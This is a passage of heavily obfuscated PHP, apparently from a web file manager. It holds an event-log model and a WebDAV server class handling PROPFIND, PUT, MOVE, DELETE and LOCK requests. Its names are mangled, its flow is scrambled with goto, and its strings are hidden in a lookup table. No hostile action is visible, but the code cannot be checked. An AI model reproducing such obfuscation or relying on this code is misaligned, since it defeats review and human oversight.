$CÓ‰àöÙÕŸ); } public function eventRemove($BŠ«Ÿ®àì¢) { $Dö›‹Ø˜ò =& $_SERVER[÷ÖêïÔÔÓ]; $F…áæÁó‡Î = Model($Dö›‹Ø˜ò[1077])->sourceInfo($BŠ«Ÿ®àì¢); $E‚¾™¹÷Óå = $F…áæÁó‡Î[$Dö›‹Ø˜ò[28]]; return $this->addEvent($F…áæÁó‡Î[$Dö›‹Ø˜ò[457]], $Dö›‹Ø˜ò[1972], $E‚¾™¹÷Óå); } public function eventShare($bÉŸõ²Ìõ†, $døè ‘©Ûõ) { return $this->addEvent($bÉŸõ²Ìõ†, $_SERVER[÷ÖêïÔÔÓ][1981], $døè ‘©Ûõ); } public function eventMove($a¥Ô‘¸Êª, $AÎ©›âªÔ, $BÛ„ô§İ¨µ) { goto c×Ìª®Õ ; Dˆí”æÚÃÕ: $EÍèŒ–›ß = $c„‰Âªå˜‰->sourceInfo($AÎ©›âªÔ); $e½£È…ª†‹ = $c„‰Âªå˜‰->sourceInfo($BÛ„ô§İ¨µ); $eÔë‹¸ÅˆÕ = array($C·—öÜ’Ô¶[979] => $AÎ©›âªÔ, $C·—öÜ’Ô¶[2179] => $EÍèŒ–›ß[$C·—öÜ’Ô¶[28]], $C·—öÜ’Ô¶[2180] => $EÍèŒ–›ß[$C·—öÜ’Ô¶[462]], $C·—öÜ’Ô¶[980] => $BÛ„ô§İ¨µ, $C·—öÜ’Ô¶[2181] => $e½£È…ª†‹[$C·—öÜ’Ô¶[28]], $C·—öÜ’Ô¶[2182] => $e½£È…ª†‹[$C·—öÜ’Ô¶[462]]); goto báãë÷­Œ; C‘ÂÂç¹”ƒ: $this->addEvent($AÎ©›âªÔ, $C·—öÜ’Ô¶[2183], $eÔë‹¸ÅˆÕ); goto ağªÖ†ÅÆ; c×Ìª®Õ : $C·—öÜ’Ô¶ =& $_SERVER[÷ÖêïÔÔÓ]; $c„‰Âªå˜‰ = Model($C·—öÜ’Ô¶[1077]); $a´ÍÏ‚ƒëî = $c„‰Âªå˜‰->sourceInfo($a¥Ô‘¸Êª); goto Dˆí”æÚÃÕ; báãë÷­Œ: $this->addEvent($a¥Ô‘¸Êª, $C·—öÜ’Ô¶[484], $eÔë‹¸ÅˆÕ); $a´ÍÏ‚ƒëî = $c„‰Âªå˜‰->sourceInfo($a¥Ô‘¸Êª); $eÔë‹¸ÅˆÕ = array($C·—öÜ’Ô¶[366] => $a´ÍÏ‚ƒëî[$C·—öÜ’Ô¶[366]], $C·—öÜ’Ô¶[28] => $a´ÍÏ‚ƒëî[$C·—öÜ’Ô¶[28]]); goto C‘ÂÂç¹”ƒ; ağªÖ†ÅÆ: } public function eventCopy($A´’Õ†éš®) { $this->eventCreate($A´’Õ†éš®, $_SERVER[÷ÖêïÔÔÓ][482]); } public function eventRename($c—Ÿğ«À‘, $b¸·Ì¿¡íî, $eø¢É­Æ´…) { $aĞá‡â™ä =& $_SERVER[÷ÖêïÔÔÓ]; $e‡ ‘ùÈ„Í = array($aĞá‡â™ä[979] => $b¸·Ì¿¡íî, $aĞá‡â™ä[980] => $eø¢É­Æ´…); return $this->addEvent($c—Ÿğ«À‘, $aĞá‡â™ä[1089], $e‡ ‘ùÈ„Í); } public function eventAddComment($a‘Ü£ßè™ê, $e×é µªØ) { return $this->addEvent($a‘Ü£ßè™ê, $_SERVER[÷ÖêïÔÔÓ][2184], $e×é µªØ); } public function eventAddDesc($c÷²Á„¶™Š, $FîÊñĞÖà„) { return $this->addEvent($c÷²Á„¶™Š, $_SERVER[÷ÖêïÔÔÓ][2185], $FîÊñĞÖà„); } public function listBySource($Aïš¿…†™) { goto a²·Î¿¸ğ; a²·Î¿¸ğ: $d“Ä¿ëºã =& $_SERVER[÷ÖêïÔÔÓ]; $DÔÙƒ´òêÎ = Model($d“Ä¿ëºã[1077])->sourceInfo($Aïš¿…†™); $EÄĞ‹İ·ƒ± = array($d“Ä¿ëºã[380] => $Aïš¿…†™); goto F«ë¥†ñ¸í; aÀë—é©­­: $Fï±İ‰¨à = $this->eventListParse($Fï±İ‰¨à, $Aïš¿…†™); show_json($Fï±İ‰¨à); goto DåÌàŠ¶É; F«ë¥†ñ¸í: if ($DÔÙƒ´òêÎ[$d“Ä¿ëºã[367]] == $d“Ä¿ëºã[493]) { $CÁ«á©Ê£´ = Model($d“Ä¿ëºã[1077])->listSearchChildren($Aïš¿…†™, 20000); $CÁ«á©Ê£´[] = $Aïš¿…†™ . $d“Ä¿ëºã[358]; $EÄĞ‹İ·ƒ± = array($d“Ä¿ëºã[366] => array($d“Ä¿ëºã[7], $CÁ«á©Ê£´)); } $Fï±İ‰¨à = $this->where($EÄĞ‹İ·ƒ±)->order($d“Ä¿ëºã[2186])->selectPage(); if ($Fï±İ‰¨à[$d“Ä¿ëºã[347]][$d“Ä¿ëºã[348]] == 0) { $Fï±İ‰¨à[$d“Ä¿ëºã[347]][$d“Ä¿ëºã[348]] = 1; $Fï±İ‰¨à[$d“Ä¿ëºã[350]] = array(array($d“Ä¿ëºã[380] => $Aïš¿…†™, $d“Ä¿ëºã[2169] => $DÔÙƒ´òêÎ[$d“Ä¿ëºã[457]], $d“Ä¿ëºã[1332] => $DÔÙƒ´òêÎ[$d“Ä¿ëºã[375]], $d“Ä¿ëºã[385] => $d“Ä¿ëºã[2187], $d“Ä¿ëºã[386] => $DÔÙƒ´òêÎ[$d“Ä¿ëºã[184]], $d“Ä¿ëºã[1334] => $d“Ä¿ëºã[33])); } goto aÀë—é©­­; DåÌàŠ¶É: } private function eventListParse($CŸ¢áÌ®, $e‰…Å·…Ä) { goto Eöˆ³½ñòé; DÃ™é§«µÊ: return $CŸ¢áÌ®; goto dÔŒîó‘”; fˆäÂÛ Ü‘: $dŠ¾Ğ¾Œ–³ = Model($A°³‰Â£Èæ[748])->sourceListInfo($c±å¬ô”¯â, !0); foreach ($c»§™¸‰ö as &$aŠñˆêé£ö) { goto fŠ÷÷ˆÌ; B«·á«×™É: $aŠñˆêé£ö[$A°³‰Â£Èæ[2140]] = $BËİÓ¼Õ‰[$aŠñˆêé£ö[$A°³‰Â£Èæ[1341]]]; goto FĞñ¸µãÊ¶; fŠ÷÷ˆÌ: $DÎÚ½ÁÕÂá =& $aŠñˆêé£ö[$A°³‰Â£Èæ[401]]; if ($aŠñˆêé£ö[$A°³‰Â£Èæ[29]] == $A°³‰Â£Èæ[484] && isset($DÎÚ½ÁÕÂá[$A°³‰Â£Èæ[979]])) { $DÎÚ½ÁÕÂá[$A°³‰Â£Èæ[979]] = $dŠ¾Ğ¾Œ–³[$DÎÚ½ÁÕÂá[$A°³‰Â£Èæ[979]]]; $DÎÚ½ÁÕÂá[$A°³‰Â£Èæ[980]] = $dŠ¾Ğ¾Œ–³[$DÎÚ½ÁÕÂá[$A°³‰Â£Èæ[980]]]; } if ($aŠñˆêé£ö[$A°³‰Â£Èæ[29]] == $A°³‰Â£Èæ[2183] && isset($DÎÚ½ÁÕÂá[$A°³‰Â£Èæ[366]])) { $DÎÚ½ÁÕÂá[$A°³‰Â£Èæ[366]] = $dŠ¾Ğ¾Œ–³[$DÎÚ½ÁÕÂá[$A°³‰Â£Èæ[366]]]; } goto F¿…©²¦¡; F¿…©²¦¡: $aŠñˆêé£ö[$A°³‰Â£Èæ[388]] = $dŠ¾Ğ¾Œ–³[$aŠñˆêé£ö[$A°³‰Â£Èæ[366]]]; $aŠñˆêé£ö[$A°³‰Â£Èæ[2188]] = $dŠ¾Ğ¾Œ–³[$aŠñˆêé£ö[$A°³‰Â£Èæ[2175]]]; if ($aŠñˆêé£ö[$A°³‰Â£Èæ[29]] == $A°³‰Â£Èæ[1972]) { $aŠñˆêé£ö[$A°³‰Â£Èæ[2188]] = $aŠñˆêé£ö[$A°³‰Â£Èæ[388]]; $aŠñˆêé£ö[$A°³‰Â£Èæ[2175]] = $aŠñˆêé£ö[$A°³‰Â£Èæ[2188]][$A°³‰Â£Èæ[366]]; $aŠñˆêé£ö[$A°³‰Â£Èæ[388]] = !1; $aŠñˆêé£ö[$A°³‰Â£Èæ[366]] = $A°³‰Â£Èæ[33]; } goto B«·á«×™É; FĞñ¸µãÊ¶: } $CŸ¢áÌ®[$A°³‰Â£Èæ[350]] = $c»§™¸‰ö; goto DÃ™é§«µÊ; eº±œÙ®È”: $c±å¬ô”¯â = array_unique($c±å¬ô”¯â); $cÌ†â½©ÊÔ = array_unique(array_to_keyvalue($c»§™¸‰ö, $A°³‰Â£Èæ[33], $A°³‰Â£Èæ[1341])); $BËİÓ¼Õ‰ = Model($A°³‰Â£Èæ[469])->userListInfo($cÌ†â½©ÊÔ); goto fˆäÂÛ Ü‘; f“Ñê±Îõã: $E¨‚¤Ùˆ = array_to_keyvalue($c»§™¸‰ö, $A°³‰Â£Èæ[33], $A°³‰Â£Èæ[2175]); foreach ($c»§™¸‰ö as $aŠñˆêé£ö) { $DÎÚ½ÁÕÂá = $aŠñˆêé£ö[$A°³‰Â£Èæ[401]]; if ($aŠñˆêé£ö[$A°³‰Â£Èæ[29]] == $A°³‰Â£Èæ[484] && isset($DÎÚ½ÁÕÂá[$A°³‰Â£Èæ[979]])) { $c±å¬ô”¯â[] = $DÎÚ½ÁÕÂá[$A°³‰Â£Èæ[979]] . $A°³‰Â£Èæ[33]; $c±å¬ô”¯â[] = $DÎÚ½ÁÕÂá[$A°³‰Â£Èæ[980]] . $A°³‰Â£Èæ[33]; } if ($aŠñˆêé£ö[$A°³‰Â£Èæ[29]] == $A°³‰Â£Èæ[2183] && isset($DÎÚ½ÁÕÂá[$A°³‰Â£Èæ[366]])) { $c±å¬ô”¯â[] = $DÎÚ½ÁÕÂá[$A°³‰Â£Èæ[366]] . $A°³‰Â£Èæ[33]; } } $c±å¬ô”¯â = array_merge($c±å¬ô”¯â, $E¨‚¤Ùˆ, array($e‰…Å·…Ä . $A°³‰Â£Èæ[33])); goto eº±œÙ®È”; Eöˆ³½ñòé: $A°³‰Â£Èæ =& $_SERVER[÷ÖêïÔÔÓ]; $c»§™¸‰ö = $CŸ¢áÌ®[$A°³‰Â£Èæ[350]]; $c±å¬ô”¯â = array_to_keyvalue($c»§™¸‰ö, $A°³‰Â£Èæ[33], $A°³‰Â£Èæ[366]); goto f“Ñê±Îõã; dÔŒîó‘”: } public function removeBySource($a¶³¯¨»¡”) { $F¬óÃŒÌ ˜ = array($_SERVER[÷ÖêïÔÔÓ][380] => $a¶³¯¨»¡”); $this->where($F¬óÃŒÌ ˜)->remove(); } } goto aÄÆËåàç; cº½ï„¿ùƒ: class HttpDavServer { public function __construct($A–µ±·ÁâŠ, $aÂº³Ó‰”º) { $this->root = $A–µ±·ÁâŠ; $this->initPath($aÂº³Ó‰”º); $this->start(); } public function initPath($eÇÔÉ®İºß) { $aÇÛ Ä³°á =& $_SERVER[÷ÖêïÔÔÓ]; $a™’±‡ÓĞÓ = rtrim($_SERVER[$aÇÛ Ä³°á[1294]], $aÇÛ Ä³°á[8]) . $aÇÛ Ä³°á[8]; $this->urlBase = substr($a™’±‡ÓĞÓ, 0, strpos($a™’±‡ÓĞÓ, $eÇÔÉ®İºß) + 1); $this->urlBase = rtrim($this->urlBase, $aÇÛ Ä³°á[8]) . $eÇÔÉ®İºß; $this->path = $this->parsePath($this->pathGet()); } public function checkUser() { $FñåŒ¨°Ã„ =& $_SERVER[÷ÖêïÔÔÓ]; $CÑĞŒĞÓ = HttpAuth::get(); if ($CÑĞŒĞÓ[$FñåŒ¨°Ã„[527]] == $FñåŒ¨°Ã„[1684] && $CÑĞŒĞÓ[$FñåŒ¨°Ã„[893]] == $FñåŒ¨°Ã„[1685]) { return !0; } HttpAuth::error(); } public function start() { goto F‚Ô½ğ; a‚ÜíğÁ: if (!$D‡‹¦®¶º) { return; } self::response($D‡‹¦®¶º); goto f©í¿ùÅäï; e‰ÒÀÎ¬Œ : if (!method_exists($this, $fºá†Àº£œ)) { pr($fºá†Àº£œ . $c’´ŠŠ•—[1686]); die; } $c×÷¤¾¸‚¼ = array($c’´ŠŠ•—[1687], $c’´ŠŠ•—[1688]); if (!in_array($fºá†Àº£œ, $c×÷¤¾¸‚¼) && !$this->pathExists($this->path)) { $D‡‹¦®¶º = array($c’´ŠŠ•—[1006] => 404); } else { $D‡‹¦®¶º = $this->{$fºá†Àº£œ}(); } goto a‚ÜíğÁ; F‚Ô½ğ: $c’´ŠŠ•— =& $_SERVER[÷ÖêïÔÔÓ]; $this->checkUser(); $fºá†Àº£œ = $c’´ŠŠ•—[141] . HttpHeader::method(); goto e‰ÒÀÎ¬Œ ; f©í¿ùÅäï: } public function pathGet($b‚ïóï‘Û… = false) { $b·‡Ÿ—›µÍ =& $_SERVER[÷ÖêïÔÔÓ]; $eçĞËğØÍ‘ = $b‚ïóï‘Û… ? $_SERVER[$b·‡Ÿ—›µÍ[1689]] : $_SERVER[$b·‡Ÿ—›µÍ[1294]]; $eçĞËğØÍ‘ = KodIO::clear(rawurldecode($eçĞËğØÍ‘)); if (!strstr($eçĞËğØÍ‘, KodIO::clear($this->urlBase))) { return !1; } return substr($eçĞËğØÍ‘, strpos($eçĞËğØÍ‘, $this->urlBase) + strlen($this->urlBase)); } public function pathExists($aèó‰„‡÷) { return file_exists($aèó‰„‡÷); } public function pathMkdir($E²ÏïÈê‹œ) { return mkdir($E²ÏïÈê‹œ, 511, !0); } public function pathInfo($Eœ¥¤Ï·ÄÙ) { return path_info($Eœ¥¤Ï·ÄÙ); } public function pathList($a¿áŒÇÕƒ) { return path_list($a¿áŒÇÕƒ); } public function pathOut($c„°ğĞñÒ÷) { echo file_get_contents($c„°ğĞñÒ÷); } public function pathPut($CŞÕ‘©îô, $DêŠ¯à‘Ê¨ = '') { if (!$DêŠ¯à‘Ê¨) { return file_put_contents($CŞÕ‘©îô, $_SERVER[÷ÖêïÔÔÓ][33]); } return move_path($DêŠ¯à‘Ê¨, $CŞÕ‘©îô); } public function pathRemove($E¬—øœù·Š) { if (is_file($E¬—øœù·Š)) { return @unlink($this->path); } else { return del_dir($this->path); } } public function pathMove($Fƒß˜ ¤³, $aö¾ø™Ş¸¸) { return move_path($Fƒß˜ ¤³, $aö¾ø™Ş¸¸); } public function pathCopy($B»ÙÙÍÃôÕ, $AâËíê„) { return copy_dir($B»ÙÙÍÃôÕ, $AâËíê„); } public function parsePath($aí„Ñ¤ˆ°Ğ) { return $aí„Ñ¤ˆ°Ğ; } public function parseItem($CÜº­­‰Û½) { goto D“øíäé®´; D“øíäé®´: $aÊßôœùíÏ =& $_SERVER[÷ÖêïÔÔÓ]; $b…¡ëõóŸ = $this->pathGet() . $aÊßôœùíÏ[8] . $CÜº­­‰Û½[$aÊßôœùíÏ[28]]; $b…¡ëõóŸ = str_replace($aÊßôœùíÏ[169], $aÊßôœùíÏ[8], rawurlencode($b…¡ëõóŸ)); goto AáˆÜ¬ÈšÚ; Dì¸“½Ô†®: return $eö£‚ãÜçí; goto d‰èÖ×êÒ; AáˆÜ¬ÈšÚ: if (!trim($CÜº­­‰Û½[$aÊßôœùíÏ[106]])) { $CÜº­­‰Û½[$aÊßôœùíÏ[106]] = time(); } if (!trim($CÜº­­‰Û½[$aÊßôœùíÏ[184]])) { $CÜº­­‰Û½[$aÊßôœùíÏ[184]] = time(); } $eö£‚ãÜçí = array($aÊßôœùíÏ[1690] => KodIO::clear($this->urlBase . $aÊßôœùíÏ[8] . $b…¡ëõóŸ), $aÊßôœùíÏ[106] => @gmdate($aÊßôœùíÏ[1691], $CÜº­­‰Û½[$aÊßôœùíÏ[106]]), $aÊßôœùíÏ[184] => @gmdate($aÊßôœùíÏ[1692], $CÜº­­‰Û½[$aÊßôœùíÏ[184]]), $aÊßôœùíÏ[78] => $CÜº­­‰Û½[$aÊßôœùíÏ[78]] ? $CÜº­­‰Û½[$aÊßôœùíÏ[78]] : 0); goto Dì¸“½Ô†®; d‰èÖ×êÒ: } public function parseItemXml($AéÉ’ÍãÉÀ) { $DàÊ§Ã¤é¦ =& $_SERVER[÷ÖêïÔÔÓ]; $Fİª³ğÀİ¶ = $this->parseItem($AéÉ’ÍãÉÀ); if ($AéÉ’ÍãÉÀ[$DàÊ§Ã¤é¦[29]] == $DàÊ§Ã¤é¦[77]) { $aÊ¡ßÄ§Êº = $DàÊ§Ã¤é¦[1693]; $aÊ¡ßÄ§Êº .= $DàÊ§Ã¤é¦[1694]; } else { $d‘ÂÛŠè·ô = $AéÉ’ÍãÉÀ[$DàÊ§Ã¤é¦[157]] ? $AéÉ’ÍãÉÀ[$DàÊ§Ã¤é¦[157]] : get_path_ext($AéÉ’ÍãÉÀ[$DàÊ§Ã¤é¦[28]]); $cáºÏ©Ïšù = get_file_mime($d‘ÂÛŠè·ô); $aÊ¡ßÄ§Êº = $DàÊ§Ã¤é¦[1695]; $aÊ¡ßÄ§Êº .= "\74\x44\x3a\147\x65\164\x63\157\x6e\164\x65\156\164\164\171\x70\145\x3e{$cáºÏ©Ïšù}\x3c\57\x44\x3a\147\145\164\x63\x6f\156\164\145\x6e\164\164\x79\160\x65\76"; } return "\xa\x9\11\74\104\72\x72\145\163\160\x6f\x6e\163\x65\76\12\x9\11\x9\74\104\x3a\150\x72\145\146\x3e{$Fİª³ğÀİ¶[$DàÊ§Ã¤é¦[1690]]}\74\57\x44\x3a\150\162\x65\146\x3e\xa\11\x9\11\x3c\104\x3a\x70\162\x6f\x70\163\x74\141\164\x3e\xa\x9\x9\11\x9\74\x44\x3a\160\x72\157\x70\76\xa\11\x9\x9\11\11\x3c\x44\72\147\145\164\x6c\x61\x73\164\155\157\x64\x69\x66\x69\145\x64\x3e{$Fİª³ğÀİ¶[$DàÊ§Ã¤é¦[106]]}\x3c\57\104\x3a\147\x65\164\x6c\141\163\164\x6d\157\x64\x69\x66\x69\145\x64\76\12\x9\x9\11\x9\x9\74\x44\72\143\162\x65\141\164\151\157\x6e\144\x61\164\145\x3e{$Fİª³ğÀİ¶[$DàÊ§Ã¤é¦[184]]}\x3c\57\104\72\143\x72\x65\141\164\x69\x6f\156\x64\141\x74\145\x3e\12\11\x9\x9\x9\11\74\104\x3a\147\145\x74\x63\x6f\x6e\164\x65\156\164\154\x65\156\147\164\150\x3e{$Fİª³ğÀİ¶[$DàÊ§Ã¤é¦[78]]}\x3c\57\104\72\x67\x65\164\x63\x6f\156\164\145\x6e\164\x6c\145\156\147\x74\x68\76\12\x9\x9\11\11\x9{$aÊ¡ßÄ§Êº}\xa\11\x9\x9\11\x3c\x2f\104\72\160\162\x6f\x70\76\12\11\x9\x9\11\74\x44\x3a\163\x74\141\164\165\163\x3e\110\124\124\x50\x2f\x31\x2e\61\40\x32\60\x30\x20\x4f\x4b\74\57\x44\x3a\x73\164\x61\x74\165\163\76\xa\11\11\11\x3c\x2f\x44\72\160\162\x6f\160\x73\164\141\164\76\12\11\11\x3c\x2f\x44\72\162\x65\x73\160\x6f\x6e\163\145\x3e"; } public function pathListMerge($B…Ÿ²Ä°Â) { goto cŠ…œ‹‹ƒ½; cÂ“±§ÍŒ¯: $d™š¬‰¡òé = array(); foreach ($B…Ÿ²Ä°Â as $f”„Ô°ÊŸÀ => $c£®ÔÕ®) { if (!in_array($f”„Ô°ÊŸÀ, $CŸÔ¿¶íãÊ) || !is_array($c£®ÔÕ®)) { continue; } $d™š¬‰¡òé = array_merge($d™š¬‰¡òé, $c£®ÔÕ®); } foreach ($d™š¬‰¡òé as &$aĞ×Û‡æŠ) { $aĞ×Û‡æŠ[$CŸ•™îªã‘[28]] = str_replace($CŸ•™îªã‘[8], $CŸ•™îªã‘[1296], $aĞ×Û‡æŠ[$CŸ•™îªã‘[28]]); } goto e¤°¤–—Œ„; e¤°¤–—Œ„: return $d™š¬‰¡òé; goto eë¡œÊ…ò; cŠ…œ‹‹ƒ½: $CŸ•™îªã‘ =& $_SERVER[÷ÖêïÔÔÓ]; if (!$B…Ÿ²Ä°Â) { return $B…Ÿ²Ä°Â; } $CŸÔ¿¶íãÊ = array($CŸ•™îªã‘[74], $CŸ•™îªã‘[75], $CŸ•™îªã‘[1696]); goto cÂ“±§ÍŒ¯; eë¡œÊ…ò: } public function httpPROPFIND() { goto a…Ê¸ÙŒÁ; eùÄ’Àƒ´: if (!is_array($dğÉø¿ŞÀ)) { return array($Eª³›“¯ë[1697] => 404, $Eª³›“¯ë[1698] => $Eª³›“¯ë[1699]); } $E†–ºæÙ“ = IO::info($this->path); $F†Ã¾¼ÀÏ = array($Eª³›“¯ë[383] => $Eª³›“¯ë[33], $Eª³›“¯ë[29] => $Eª³›“¯ë[77]); goto BšÊƒóÇ¼ª; bÛ¯áà¢«‘: return array($Eª³›“¯ë[1697] => 207, $Eª³›“¯ë[1698] => "\x3c\x44\72\155\165\154\x74\151\x73\164\x61\164\x75\x73\x20\170\155\154\x6e\x73\x3a\x44\x3d\x22\x44\x41\126\x3a\42\x3e\12{$díë­Ñ Ï£}\12\74\57\x44\x3a\x6d\x75\154\164\151\163\x74\141\x74\x75\x73\76"); goto D‚ÌÄº´…õ; e´šÖŠ“È: if ($AÆ®—Ø»´¯ == $Eª³›“¯ë[464]) { $dğÉø¿ŞÀ = array($F†Ã¾¼ÀÏ); } else { $dğÉø¿ŞÀ = array_merge(array($F†Ã¾¼ÀÏ), $dğÉø¿ŞÀ); } $díë­Ñ Ï£ = $Eª³›“¯ë[33]; foreach ($dğÉø¿ŞÀ as $BÕÙ½•¥ï˜) { $díë­Ñ Ï£ .= $this->parseItemXml($BÕÙ½•¥ï˜); } goto bÛ¯áà¢«‘; a…Ê¸ÙŒÁ: $Eª³›“¯ë =& $_SERVER[÷ÖêïÔÔÓ]; $dğÉø¿ŞÀ = $this->pathList($this->path); $dğÉø¿ŞÀ = $this->pathListMerge($dğÉø¿ŞÀ); goto eùÄ’Àƒ´; BšÊƒóÇ¼ª: if ($E†–ºæÙ“) { $F†Ã¾¼ÀÏ[$Eª³›“¯ë[184]] = $E†–ºæÙ“[$Eª³›“¯ë[184]]; $F†Ã¾¼ÀÏ[$Eª³›“¯ë[106]] = $E†–ºæÙ“[$Eª³›“¯ë[106]]; $F†Ã¾¼ÀÏ[$Eª³›“¯ë[157]] = $E†–ºæÙ“[$Eª³›“¯ë[157]]; $F†Ã¾¼ÀÏ[$Eª³›“¯ë[29]] = $E†–ºæÙ“[$Eª³›“¯ë[29]]; } $AÆ®—Ø»´¯ = HttpHeader::get($Eª³›“¯ë[1676]); if ($F†Ã¾¼ÀÏ[$Eª³›“¯ë[29]] == $Eª³›“¯ë[164]) { $AÆ®—Ø»´¯ = $Eª³›“¯ë[464]; } goto e´šÖŠ“È; D‚ÌÄº´…õ: } public function httpHEAD() { $dÉªç¶Ñ˜ˆ =& $_SERVER[÷ÖêïÔÔÓ]; $DÛ‚ùº¸ÏÎ = $this->pathInfo($this->path); if (!$DÛ‚ùº¸ÏÎ || $DÛ‚ùº¸ÏÎ[$dÉªç¶Ñ˜ˆ[29]] == $dÉªç¶Ñ˜ˆ[77]) { return array($dÉªç¶Ñ˜ˆ[1006] => 200, $dÉªç¶Ñ˜ˆ[1166] => array($dÉªç¶Ñ˜ˆ[1700])); } return array($dÉªç¶Ñ˜ˆ[1006] => 200, $dÉªç¶Ñ˜ˆ[1166] => array($dÉªç¶Ñ˜ˆ[1701], $dÉªç¶Ñ˜ˆ[135], $dÉªç¶Ñ˜ˆ[1702] . $DÛ‚ùº¸ÏÎ[$dÉªç¶Ñ˜ˆ[78]], $dÉªç¶Ñ˜ˆ[1703] . get_file_mime($DÛ‚ùº¸ÏÎ[$dÉªç¶Ñ˜ˆ[157]]), $dÉªç¶Ñ˜ˆ[131] . gmdate($dÉªç¶Ñ˜ˆ[1691], $DÛ‚ùº¸ÏÎ[$dÉªç¶Ñ˜ˆ[1209]]) . $dÉªç¶Ñ˜ˆ[1704], $dÉªç¶Ñ˜ˆ[1705])); } public function httpOPTIONS() { $d‹ë¨Œ©©Í =& $_SERVER[÷ÖêïÔÔÓ]; return array($d‹ë¨Œ©©Í[1006] => 200, $d‹ë¨Œ©©Í[1166] => array($d‹ë¨Œ©©Í[1706], $d‹ë¨Œ©©Í[1707], $d‹ë¨Œ©©Í[1708], $d‹ë¨Œ©©Í[1666])); } public function httpPROPPATCH() { $CŞ°‹¼ =& $_SERVER[÷ÖêïÔÔÓ]; $Cß™ÏõÍó« = $CŞ°‹¼[1709] . $_SERVER[$CŞ°‹¼[1294]] . $CŞ°‹¼[1710]; return array($CŞ°‹¼[1697] => 207, $CŞ°‹¼[1698] => "\74\104\72\x6d\165\154\x74\151\163\164\x61\164\165\x73\40\x78\x6d\x6c\156\163\72\104\x3d\42\104\101\126\72\x22\76\xa{$Cß™ÏõÍó«}\xa\74\x2f\x44\72\x6d\165\x6c\x74\151\163\164\141\164\x75\x73\x3e"); } public function httpGET() { $this->pathOut($this->path); } public function httpPUT() { $D«ˆŒ¯Š°Ö =& $_SERVER[÷ÖêïÔÔÓ]; $c¹ùñÙ‚Äê = $this->uploadFile(); if ($c¹ùñÙ‚Äê) { $Aª¤¨•á¿ = 204; } else { $c¹ùñÙ‚Äê = $D«ˆŒ¯Š°Ö[33]; $Aª¤¨•á¿ = 201; } $aåÁ…•Šå = $this->pathPut($this->path, $c¹ùñÙ‚Äê); if ($aåÁ…•Šå == !1) { $Aª¤¨•á¿ = 404; } return array($D«ˆŒ¯Š°Ö[1697] => $Aª¤¨•á¿); } private function uploadFile() { goto FÃøÂ©•Û; c¢ê—Æè: $f¸ª¾ÔµÂ· = @fopen($eƒÓºÀ®íì, $bÏÏÎÌ¦’Í[1421]); $C‡õñÙ = @fopen($bÏÏÎÌ¦’Í[1712], $bÏÏÎÌ¦’Í[1420]); if (!$C‡õñÙ || !$f¸ª¾ÔµÂ·) { @unlink($eƒÓºÀ®íì); return !1; } goto bèÚ‘ÇÁï ; FÃøÂ©•Û: $bÏÏÎÌ¦’Í =& $_SERVER[÷ÖêïÔÔÓ]; @mk_dir(TEMP_FILES); $eƒÓºÀ®íì = TEMP_FILES . $bÏÏÎÌ¦’Í[1711] . rand_string(32); goto c¢ê—Æè; bèÚ‘ÇÁï : while (!feof($C‡õñÙ)) { fwrite($f¸ª¾ÔµÂ·, fread($C‡õñÙ, 1024 * 200)); } fclose($C‡õñÙ); fclose($f¸ª¾ÔµÂ·); goto f©‚Êˆ•œ; f©‚Êˆ•œ: if (@filesize($eƒÓºÀ®íì) > 0) { return $eƒÓºÀ®íì; } @unlink($eƒÓºÀ®íì); return !1; goto dçàóñÌ¦§; dçàóñÌ¦§: } public function httpMKCOL() { $B¯Ñ›‡³­ =& $_SERVER[÷ÖêïÔÔÓ]; if ($this->pathExists($this->path)) { return array($B¯Ñ›‡³­[1006] => 409); } $Fºø§œ÷Ü = $this->pathMkdir($this->path); return array($B¯Ñ›‡³­[1006] => $Fºø§œ÷Ü ? 201 : 403); } public function httpMOVE() { $a³ï¢»äëá =& $_SERVER[÷ÖêïÔÔÓ]; $C³à‡”¨×° = $this->parsePath($this->pathGet(!0)); if (isset($_SERVER[$a³ï¢»äëá[1713]])) { $e‡Ù×Ùø[$a³ï¢»äëá[1714]] = $_SERVER[$a³ï¢»äëá[1713]] == $a³ï¢»äëá[1715]; } $eÔ ƒ¦—œÔ = $this->pathMove($this->path, $C³à‡”¨×°); return array($a³ï¢»äëá[1006] => $eÔ ƒ¦—œÔ ? 201 : 404); } public function httpCOPY() { $EáŠåÜÙ¾¸ = $this->parsePath($this->pathGet(!0)); $BƒĞ“¥Å‚ = $this->pathCopy($this->path, $EáŠåÜÙ¾¸); return array($_SERVER[÷ÖêïÔÔÓ][1006] => $BƒĞ“¥Å‚ ? 201 : 404); } public function httpDELETE() { $dóºœÚ®éã = $this->pathRemove($this->path); return array($_SERVER[÷ÖêïÔÔÓ][1006] => $dóºœÚ®éã ? 200 : 503); } public function httpLOCK() { $d·†ŞŠŒŒô =& $_SERVER[÷ÖêïÔÔÓ]; $a¡¬Ü‡á»À = md5($this->path); $c—ƒ¼ïëƒ“ = $d·†ŞŠŒŒô[1716] . $this->xmlGet($d·†ŞŠŒŒô[1717]) . $d·†ŞŠŒŒô[1718] . $a¡¬Ü‡á»À . $d·†ŞŠŒŒô[1719]; return array($d·†ŞŠŒŒô[1006] => 200, $d·†ŞŠŒŒô[1166] => array($d·†ŞŠŒŒô[1720] . $a¡¬Ü‡á»À, $d·†ŞŠŒŒô[1721]), $d·†ŞŠŒŒô[1722] => $c—ƒ¼ïëƒ“); } public function httpUNLOCK() { return array($_SERVER[÷ÖêïÔÔÓ][1006] => 204); } public function xmlGet($c¬­åÊï¿Ş) { goto fëœ­ÖŸ¼; fëœ­ÖŸ¼: $f½÷ÆÛØù› =& $_SERVER[÷ÖêïÔÔÓ]; static $FŒâïé·Ä = false; if (!$FŒâïé·Ä) { $bí‚Ù’¥‡ = file_get_contents($f½÷ÆÛØù›[1723]); $FŒâïé·Ä = new DOMDocument(); $FŒâïé·Ä->loadXML($bí‚Ù’¥‡); } goto a‰¬Àí„ƒØ; açÌçÈ¹Û: return $f½÷ÆÛØù›[33]; goto DŸ¶Ù³òŸ; a‰¬Àí„ƒØ: $aÚ…Ğ£ªš = array_shift(explode($f½÷ÆÛØù›[8], $c¬­åÊï¿Ş)); $d‰ä—òï° = $FŒâïé·Ä->getElementsByTagNameNS($f½÷ÆÛØù›[1724], $aÚ…Ğ£ªš); if ($d‰ä—òï°) { return $d‰ä—òï°[0]->nodeValue; } goto açÌçÈ¹Û; DŸ¶Ù³òŸ: } public static function response($c¼ìˆµöº‹) { goto e£´ÒÅ›¥; bğŸº¸ê«: $fµ×ôíöÓ[] = $C™äºÇÔî[1664]; $fµ×ôíöÓ[] = $C™äºÇÔî[1665]; foreach ($fµ×ôíöÓ as 